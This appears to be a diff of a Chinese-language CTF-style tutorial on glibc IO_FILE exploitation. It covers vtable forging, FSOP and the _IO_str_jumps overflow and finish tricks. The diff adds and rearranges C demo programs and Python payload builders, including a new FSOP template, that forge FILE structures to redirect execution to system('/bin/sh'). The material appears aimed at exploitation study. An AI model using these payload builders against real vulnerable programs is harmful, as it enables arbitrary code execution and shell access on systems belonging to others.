@@ -1,6 +1,7 @@
 - [IO攻击](#io攻击)
   - [基础结构体](#基础结构体)
     - [\_IO\_FILE](#_io_file)
+    - [\_IO\_FILE\_plus](#_io_file_plus)
     - [\_IO\_jump\_t](#_io_jump_t)
     - [\_IO\_file\_jumps](#_io_file_jumps)
       - [\_IO\_file\_finish](#_io_file_finish)
@@ -22,7 +23,6 @@
       - [\_IO\_file\_stat](#_io_file_stat)
       - [\_IO\_default\_showmanyc](#_io_default_showmanyc)
       - [\_IO\_default\_imbue](#_io_default_imbue)
-    - [\_IO\_FILE\_plus](#_io_file_plus)
   - [伪造 `vtable` 劫持程序流程](#伪造-vtable-劫持程序流程)
   - [FSOP](#fsop)
   - [glibc-2.24 下的 IO\_FILE](#glibc-224-下的-io_file)
@@ -79,6 +79,16 @@ struct _IO_FILE // size = 0xD8
     int _mode;     // 偏移量:0xC0 大小:0x4
 
     char _unused2[15 * sizeof(int) - 4 * sizeof(void *) - sizeof(size_t)]; // 偏移量:0xC4 大小:0x14
+};
+```
+
+### _IO_FILE_plus
+
+```C
+struct _IO_FILE_plus // size = 0xE0
+{
+    FILE file;                       // size = 0xD8
+    const struct _IO_jump_t *vtable; // size(*vtable) = 0xA8
 };
 ```
 
@@ -216,16 +226,6 @@ const struct _IO_jump_t _IO_file_jumps libio_vtable =
 
 什么都没有
 
-### _IO_FILE_plus
-
-```C
-struct _IO_FILE_plus // size = 0xE0
-{
-    FILE file;                       // size = 0xD8
-    const struct _IO_jump_t *vtable; // size(*vtable) = 0xA8
-};
-```
-
 ## 伪造 `vtable` 劫持程序流程
 
 __利用版本:__
@@ -236,14 +236,14 @@ __原理:__
 
 修改 `_IO_FILE_plus` 的 `vtable` 指针指向 `fake_vtable`
 
-`vtable` 中的函数调用时会把对应的 `_IO_FILE_plus` 指针作为第一个参数传递，因此这里我们把 `sh` 写入 `_IO_FILE_plus` 头部
+`vtable` 中的函数调用时会把对应的 `_IO_FILE_plus` 指针作为第一个参数传递，因此这里我们把 `/bin/sh` 写入 `_IO_FILE_plus` 头部
 
 __攻击:__
 
-根据[\_IO\_FILE\_plus](#_io_file_plus)结构体可以计算出`vtable`指针在`_IO_FILE_plus+0xD8`的位置
-在内存中伪造一个`fake_vtable`，然后让`_IO_FILE_plus->vtable=&fake_vtable`
-`fake_vtable`中设置函数指针
-修改`_IO_FILE_plus`头为`/bin/sh`值
+1. 伪造一个`fake_vtable`，并在`fake_vtable`中设置函数指针
+2. 修改`_IO_FILE_plus`头为`/bin/sh`值
+3. 修改`_IO_FILE_plus->vtable = fake_vtable`
+4. 通过触发`fake_vtable`中的函数指针即可触发漏洞
 
 __示例:__
 
@@ -258,11 +258,16 @@ int main()
 {
     u64 fake_vtable = MALLOC(0x100);
 
-    SET_ADDR_VALUE(stdout, BINSH);                      // 设置stdout的_IO_FILE的前八个字节为/bin/sh值
-    SET_ADDR_OFFSET_VALUE(stdout, 0xD8, fake_vtable);   // 设置stdout的value为fake_vtable
+    // 设置fake_vtable
     SET_ADDR_OFFSET_VALUE(fake_vtable, 7 * 8, &system); // 设置fake_vtable的第7个函数指针(__xsputn)为system
 
+    // 设置_IO_FILE和vtable
+    SET_ADDR_VALUE(stdout, BINSH);                      // 设置stdout的_IO_FILE的前八个字节为/bin/sh值
+    SET_ADDR_OFFSET_VALUE(stdout, 0xD8, fake_vtable);   // 设置stdout的vtable为fake_vtable
+
+    // 触发漏洞
     puts(""); // 触发_IO_FILE的__xsputn函数指针，即system("/bin/sh")
+    
     return 0;
 }
 ```
@@ -299,12 +304,14 @@ while (fp != NULL)
 
 __攻击:__
 
-1. 设置 `fake_IO_FILE` 的 `_mode = 0`, `fp->_IO_write_ptr = 1`, `fp->_IO_write_base = 0`
-2. 设置 `fake_IO_FILE` 的 `vtable = fake_vtable`
-3. 设置`fake_vtable->__overflow = system`，修改`fake_IO_FILE`头为`/bin/sh`值
-4. 也可以设置 `fake_vtable->__overflow = one_gadget` (第四个函数)
-5. 修改 `_IO_FILE->_chain` 或者 `_IO_list_all` 为 `fake_IO_FILE`
-6. `main`返回时或者调用`exit`时即可触发
+1. 设置 `fake_IO_FILE` 的 `fp->_mode <= 0`, 
+2. 设置 `fake_IO_FILE` 的 `fp->_IO_write_ptr = 1`
+3. 设置 `fake_IO_FILE` 的 `fp->_IO_write_base = 0`
+4. 设置 `fake_IO_FILE` 的 `vtable = fake_vtable`
+5. 设置 `fake_IO_FILE` 的头为`/bin/sh`值
+6. 设置 `fake_vtable->__overflow = system`，或者设置 `fake_vtable->__overflow = one_gadget`
+7. 修改 `_IO_FILE->_chain` 或者 `_IO_list_all` 为 `fake_IO_FILE`
+8. `main`返回时或者调用`exit`时即可触发
 
 __示例:__
 
@@ -317,22 +324,52 @@ __示例:__
 
 int main()
 {
-    u64 fake_FILE_vtable = MALLOC(0x100); // fake_IO_FILE_PLUS和fake_vtable
+    u64 fake_IO_FILE = MALLOC(0x100);
 
-    SET_ADDR_OFFSET_VALUE(fake_FILE_vtable, 0, BINSH);                            // 修改fake_IO_FILE头为/bin/sh值
-    SET_ADDR_OFFSET_VALUE(fake_FILE_vtable, 0x20, 0);                             // 设置fake_IO_FILE_PLUS->_IO_write_base=0
-    SET_ADDR_OFFSET_VALUE(fake_FILE_vtable, 0x28, 1);                             // 设置fake_IO_FILE_PLUS->_IO_write_ptr=1
-    SET_ADDR_OFFSET_VALUE(fake_FILE_vtable, 0xC0, 0);                             // 设置fake_IO_FILE_PLUS->_mode=0
-    SET_ADDR_OFFSET_VALUE(fake_FILE_vtable, 0x20 + 0x18, &system);                // 设置fake_vtable->__overflow=system，0x20表示fake_vtable相对于fake_FILE_vtable的偏移，0x18表示__overflow相对于fake_vtable的偏移
-    SET_ADDR_OFFSET_VALUE_OFFSET(fake_FILE_vtable, 0xD8, fake_FILE_vtable, 0x20); // 设置fake_IO_FILE_PLUS->vtable=fake_vtable
+    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0xC0, 0);            // 设置fake_IO_FILE->_mode=0
+    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0x28, 1);            // 设置fake_IO_FILE->_IO_write_ptr=1
+    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0x20, 0);            // 设置fake_IO_FILE->_IO_write_base=0
+    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0xD8, fake_IO_FILE); // 设置fake_IO_FILE->vtable=fake_vtable
+    SET_ADDR_VALUE(fake_IO_FILE, BINSH);                     // 修改fake_IO_FILE头为/bin/sh值
+    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0x18, &system);      // 设置fake_vtable->__overflow=system，0x18表示__overflow相对于fake_vtable的偏移
 
-    SET_ADDR_OFFSET_VALUE(stderr, 0x68, fake_FILE_vtable); // 设置stderr->chain为fake_FILE_vtable
+    SET_ADDR_OFFSET_VALUE(stderr, 0x68, fake_IO_FILE); // 设置stderr->chain为fake_FILE_vtable
 
     return 0; // 触发漏洞
 }
 ```
 
+__模板:__
+
+```python
+def FSOP(payload_addr, fun, param_value = BINSH, chain = 0):
+    '''
+        FSOP攻击工具
+        
+        payload_addr: payload将要写入的地址
+        fun: 要调用的函数的地址
+        param_value: 要调用函数的参数为payload_addr, param_value为函数的参数指针所指向的地址的值
+        chain: 下一个链的地址(可选)
+    '''
+    payload = b''
+    payload = set_value(payload, 0xC0, 0);            # 设置fake_IO_FILE->_mode=0
+    payload = set_value(payload, 0x28, 1);            # 设置fake_IO_FILE->_IO_write_ptr=1
+    payload = set_value(payload, 0x20, 0);            # 设置fake_IO_FILE->_IO_write_base=0
+    
+    payload = set_value(payload, 0xD8, payload_addr); # 设置fake_IO_FILE->vtable=fake_vtable
+    payload = set_value(payload, 0, param_value);     # 修改fake_IO_FILE头为/bin/sh值
+    payload = set_value(payload, 0x18, fun);          # 设置fake_vtable->__overflow=system，0x18表示__overflow相对于fake_vtable的偏移
+    
+    payload = set_value(payload, 0x68, chain);        # 修改fake_IO_FILE的chain
+    
+    return payload
+```
+
 ## glibc-2.24 下的 IO_FILE
+
+__原理:__
+
+将`_IO_FILE_plus`的`vtable`指向`_IO_str_jumps`，调用`_IO_str_jumps`中的函数指针
 
 __注:__
 
@@ -343,25 +380,26 @@ __注:__
 ### _IO_strfile
 
 ```C
-typedef void *(*_IO_alloc_type) (_IO_size_t);
-typedef void (*_IO_free_type) (void*);
+// strfile.h
+typedef void *(*_IO_alloc_type)(_IO_size_t);
+typedef void (*_IO_free_type)(void *);
 
-struct _IO_streambuf
+struct _IO_streambuf // size = 0xE0
 {
-  struct _IO_FILE _f;               // size = 0xD8
-  const struct _IO_jump_t *vtable;  // size(*vtable) = 0xA8
+    struct _IO_FILE _f;              // size = 0xD8
+    const struct _IO_jump_t *vtable; // size(*vtable) = 0xA8
 };
 
-struct _IO_str_fields
+struct _IO_str_fields // size = 0x10
 {
-  _IO_alloc_type _allocate_buffer;  // 函数指针
-  _IO_free_type _free_buffer;       // 函数指针
+    _IO_alloc_type _allocate_buffer; // 函数指针
+    _IO_free_type _free_buffer;      // 函数指针
 };
 
-typedef struct _IO_strfile_
+typedef struct _IO_strfile_ // size = 0xF0
 {
-    struct _IO_streambuf _sbf;      // 0xE0
-    struct _IO_str_fields _s;       // 0x10
+    struct _IO_streambuf _sbf; // 0xE0
+    struct _IO_str_fields _s;  // 0x10
 } _IO_strfile;
 ```
 
@@ -370,26 +408,26 @@ typedef struct _IO_strfile_
 ```C
 const struct _IO_jump_t _IO_str_jumps libio_vtable =
 {
-  JUMP_INIT_DUMMY,    // 2
-  JUMP_INIT(finish, _IO_str_finish),
-  JUMP_INIT(overflow, _IO_str_overflow),
-  JUMP_INIT(underflow, _IO_str_underflow),
-  JUMP_INIT(uflow, _IO_default_uflow),
-  JUMP_INIT(pbackfail, _IO_str_pbackfail),
-  JUMP_INIT(xsputn, _IO_default_xsputn),
-  JUMP_INIT(xsgetn, _IO_default_xsgetn),
-  JUMP_INIT(seekoff, _IO_str_seekoff),
-  JUMP_INIT(seekpos, _IO_default_seekpos),
-  JUMP_INIT(setbuf, _IO_default_setbuf),
-  JUMP_INIT(sync, _IO_default_sync),
-  JUMP_INIT(doallocate, _IO_default_doallocate),
-  JUMP_INIT(read, _IO_default_read),
-  JUMP_INIT(write, _IO_default_write),
-  JUMP_INIT(seek, _IO_default_seek),
-  JUMP_INIT(close, _IO_default_close),
-  JUMP_INIT(stat, _IO_default_stat),
-  JUMP_INIT(showmanyc, _IO_default_showmanyc),
-  JUMP_INIT(imbue, _IO_default_imbue)
+    JUMP_INIT_DUMMY,    // 2
+    JUMP_INIT(finish, _IO_str_finish),
+    JUMP_INIT(overflow, _IO_str_overflow),
+    JUMP_INIT(underflow, _IO_str_underflow),
+    JUMP_INIT(uflow, _IO_default_uflow),
+    JUMP_INIT(pbackfail, _IO_str_pbackfail),
+    JUMP_INIT(xsputn, _IO_default_xsputn),
+    JUMP_INIT(xsgetn, _IO_default_xsgetn),
+    JUMP_INIT(seekoff, _IO_str_seekoff),
+    JUMP_INIT(seekpos, _IO_default_seekpos),
+    JUMP_INIT(setbuf, _IO_default_setbuf),
+    JUMP_INIT(sync, _IO_default_sync),
+    JUMP_INIT(doallocate, _IO_default_doallocate),
+    JUMP_INIT(read, _IO_default_read),
+    JUMP_INIT(write, _IO_default_write),
+    JUMP_INIT(seek, _IO_default_seek),
+    JUMP_INIT(close, _IO_default_close),
+    JUMP_INIT(stat, _IO_default_stat),
+    JUMP_INIT(showmanyc, _IO_default_showmanyc),
+    JUMP_INIT(imbue, _IO_default_imbue)
 };
 ```
 
@@ -401,17 +439,16 @@ __原理:__
 
 __攻击:__
 
-1. 伪造`fake_IO_FILE`
-2. `fake_IO_FILE->_flags = 0`
-3. `fake_IO_FILE->_IO_write_ptr = (/bin/sh地址 - 100) / 2 + 1`
-4. `fake_IO_FILE->_IO_buf_base = 0`
-5. `fake_IO_FILE->_IO_write_base = 0`
-6. `fake_IO_FILE->_IO_buf_end = (/bin/sh地址 - 100) / 2`
-7. `fake_IO_FILE->_mode = 0`
-8. `fake_IO_FILE + 0xD8 = &_IO_str_jumps`(将`vtable`指向`_IO_str_jumps`)
-9. `fake_IO_FILE + 0xE0 = &system`
-10. 修改 `_IO_FILE->_chain` 或者 `_IO_list_all` 为 `fake_IO_FILE`
-11. exit时即可触发漏洞
+1. `fake_IO_FILE->_flags = 0`
+2. `fake_IO_FILE->_IO_write_ptr = (/bin/sh地址 - 100) / 2 + 1`
+3. `fake_IO_FILE->_IO_buf_base = 0`
+4. `fake_IO_FILE->_IO_write_base = 0`
+5. `fake_IO_FILE->_IO_buf_end = (/bin/sh地址 - 100) / 2`
+6. `fake_IO_FILE->_mode = 0`
+7. `fake_IO_FILE->vtable = &_IO_str_jumps`
+8. `fake_IO_FILE + 0xE0 = &system`
+9.  修改 `_IO_FILE->_chain` 或者 `_IO_list_all` 为 `fake_IO_FILE`
+10. `exit`时即可触发漏洞
 
 __示例:__
 
@@ -428,7 +465,7 @@ int main()
 {
     u64 str_jumps = GET_VALUE(stdin) - (0x3EBA00 - 0x3E8360);
 
-    u64 fake_IO_FILE = MALLOC(0x100); // fake_IO_FILE_PLUS和fake_vtable
+    u64 fake_IO_FILE = MALLOC(0x100);
 
     SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0x0, 0);                                 // fake_IO_FILE->_flags = 0
     SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0x20, 0);                                // fake_IO_FILE->_IO_write_base = 0
@@ -436,7 +473,7 @@ int main()
     SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0x38, 0);                                // fake_IO_FILE->_IO_buf_base = 0
     SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0x40, (GET_VALUE(binsh) - 100) / 2);     // fake_IO_FILE->_IO_buf_end = (binsh地址 - 100) / 2
     SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0xC0, 0);                                // fake_IO_FILE->_mode = 0
-    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0xD8, str_jumps);                        // fake_IO_FILE + 0xD8 = &_IO_str_jumps
+    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0xD8, str_jumps);                        // fake_IO_FILE->vtable = &_IO_str_jumps
     SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0xE0, &system);                          // fake_IO_FILE + 0xE0 = &system
 
     SET_ADDR_OFFSET_VALUE(stderr, 0x68, fake_IO_FILE); // 设置stderr->chain为fake_FILE_vtable
@@ -462,16 +499,15 @@ void _IO_str_finish(_IO_FILE *fp, int dummy)
 
 __攻击:__
 
-1. 伪造`fake_IO_FILE`
-2. `fake_IO_FILE->_flags = 0`
+1. `fake_IO_FILE->_flags = 0`
+2. `fake_IO_FILE->_mode = 0`
 3. `fake_IO_FILE->_IO_write_base = 0`
 4. `fake_IO_FILE->_IO_write_ptr = 1`
 5. `fake_IO_FILE->_IO_buf_base = /bin/sh`地址
-6. `fake_IO_FILE->_mode = 0`
-7. `fake_IO_FILE + 0xD8 = &(_IO_str_jumps - 0x8)`(将`vtable`指向`_IO_str_jumps - 8`)
-8. `fake_IO_FILE + 0xE8 = system`
-9. 修改 `_IO_FILE->_chain` 或者 `_IO_list_all` 为 `fake_IO_FILE`
-10. exit时即可触发漏洞
+6. `fake_IO_FILE->vtable = &(_IO_str_jumps - 0x8)`(将`vtable`指向`_IO_str_jumps - 8`)
+7. `fake_IO_FILE + 0xE8 = system`
+8. 修改 `_IO_FILE->_chain` 或者 `_IO_list_all` 为 `fake_IO_FILE`
+9.  `exit`时即可触发漏洞
 
 __示例:__
 
@@ -495,7 +531,7 @@ int main()
     SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0x28, 1);                          // fake_IO_FILE->_IO_write_ptr = 1
     SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0x38, GET_VALUE(binsh));           // fake_IO_FILE->_IO_buf_base = /bin/sh地址
     SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0xC0, 0);                          // fake_IO_FILE->_mode = 0
-    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0xD8, GET_VALUE(str_jumps) - 0x8); // fake_IO_FILE + 0xD8 = &(_IO_str_jumps-0x8)
+    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0xD8, GET_VALUE(str_jumps) - 0x8); // fake_IO_FILE->vtable = &(_IO_str_jumps-0x8)
     SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0xE8, &system);                    // fake_IO_FILE + 0xE8 = system
 
     SET_ADDR_OFFSET_VALUE(stderr, 0x68, fake_IO_FILE); // 设置stderr->chain为fake_FILE_vtable
@@ -510,14 +546,13 @@ int main()
 from pwn import *
 from base_data import *
 
+# 使用overflow触发
 def IOoverflow(_IO_str_jumps_addr, fun_addr, param = None, payload_addr = None):
     '''
         _IO_str_jumps_addr: _IO_str_jumps地址
         fun_addr: 函数地址
         param: 函数参数, 若param为None, 则使用payload_addr内置/bin/sh
         payload_addr: 内置/bin/sh地址, 只有在param为None时有效
-        
-        返回: 伪造的_IO_strfile结构体
     '''
     if (param is None and payload_addr is None):
         raise ValueError("必须设置 param 或 payload_addr 参数")
@@ -535,18 +570,18 @@ def IOoverflow(_IO_str_jumps_addr, fun_addr, param = None, payload_addr = None):
     payload = set_value(payload, 0x38, 0)                           # fake_IO_FILE->_IO_buf_base = 0
     payload = set_value(payload, 0x40, int((param - 100) / 2))      # fake_IO_FILE->_IO_buf_end = (binsh地址 - 100) / 2
     payload = set_value(payload, 0xC0, 0)                           # fake_IO_FILE->_mode = 0
-    payload = set_value(payload, 0xD8, _IO_str_jumps_addr)          # fake_IO_FILE + 0xD8 = &_IO_str_jumps
+    payload = set_value(payload, 0xD8, _IO_str_jumps_addr)          # fake_IO_FILE->vtable = &_IO_str_jumps
     payload = set_value(payload, 0xE0, fun_addr)                    # fake_IO_FILE + 0xE0 = &system
+    
     return payload
 
+# 使用IOfinish触发
 def IOfinish(_IO_str_jumps_addr, fun_addr, param = None, payload_addr = None):
     '''
         _IO_str_jumps_addr: _IO_str_jumps地址
         fun_addr: 函数地址
         param: 函数参数, 若param为None, 则使用payload_addr内置/bin/sh
         payload_addr: 内置/bin/sh地址, 只有在param为None时有效
-        
-        返回: 伪造的_IO_strfile结构体
     '''
     if (param is None and payload_addr is None):
         raise ValueError("必须设置 param 或 payload_addr 参数")
@@ -555,6 +590,7 @@ def IOfinish(_IO_str_jumps_addr, fun_addr, param = None, payload_addr = None):
         # 设置参数
         param = payload_addr + 0x30
         pass
+    
     payload = b''
     payload = set_value(payload, 0x0, 0);                           # fake_IO_FILE->_flags = 0
     payload = set_value(payload, 0x20, 0);                          # fake_IO_FILE->_IO_write_base = 0
@@ -564,19 +600,6 @@ def IOfinish(_IO_str_jumps_addr, fun_addr, param = None, payload_addr = None):
     payload = set_value(payload, 0xC0, 0);                          # fake_IO_FILE->_mode = 0
     payload = set_value(payload, 0xD8, _IO_str_jumps_addr - 0x8);   # fake_IO_FILE + 0xD8 = &(_IO_str_jumps-0x8)
     payload = set_value(payload, 0xE8, fun_addr);                   # fake_IO_FILE + 0xE8 = system
+    
     return payload
-
-
-if __name__ == '__main__':
-    p = process('./demo')
-    
-    _IO_str_jumps_addr = int(p.recv(14), 16)
-    system_addr = int(p.recv(14), 16)
-    binsh_addr = int(p.recv(14), 16)
-    
-    # p.send(IOoverflow(_IO_str_jumps_addr, system_addr, binsh_addr))
-    p.send(IOfinish(_IO_str_jumps_addr, system_addr, binsh_addr))
-    
-    p.interactive()
-
 ```
